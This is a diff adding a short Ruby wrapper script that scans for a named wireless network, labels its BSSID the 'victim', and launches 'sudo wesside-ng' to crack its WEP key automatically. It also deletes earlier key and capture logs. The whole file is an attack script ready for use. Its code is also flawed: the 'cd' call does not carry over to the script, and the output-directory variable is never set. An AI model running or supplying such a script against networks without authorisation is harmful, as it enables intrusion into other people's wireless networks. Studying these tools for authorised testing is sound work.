@@ -1,0 +1,44 @@
+#!/usr/bin/ruby -w
+# purpose : wrapper for wesside-ng
+# NOTE:
+# - if you get "ERROR Max retransmits" message, you're too far away from the AP!
+
+usage = <<usage
+usage:
+  #{$0} [ssid] [iface]
+usage
+
+$:.unshift File.join(File.dirname(__FILE__), '.')
+require 'airutils'
+require 'pp'
+
+ifaces_wireless = AirUtils.list_ifaces_wireless()
+
+essid = nil
+if (!ARGV[0])
+  puts usage
+  pp ifaces_wireless
+  exit 2
+end
+essid = ARGV[0]
+
+iface = nil
+if (ARGV[1])
+  iface = ARGV[1] 
+elsif (ifaces_wireless.length == 1)
+  iface = ifaces_wireless[0]
+else
+  puts usage
+  pp ifaces_wireless
+  exit 2
+end
+
+bssid_victim, channel_victim = AirUtils.parse_scan(essid) 
+
+syntax_wesside = "sudo wesside-ng -i %s -v %s" % [iface, bssid_victim]
+puts syntax_wesside
+system("cd #{$dir_output}")
+system("rm -v #{$dir_output}/key.log")
+system("rm -v #{$dir_output}/prga.log")
+system("rm -v #{$dir_output}/wep.cap")
+rc = system(syntax_wesside)
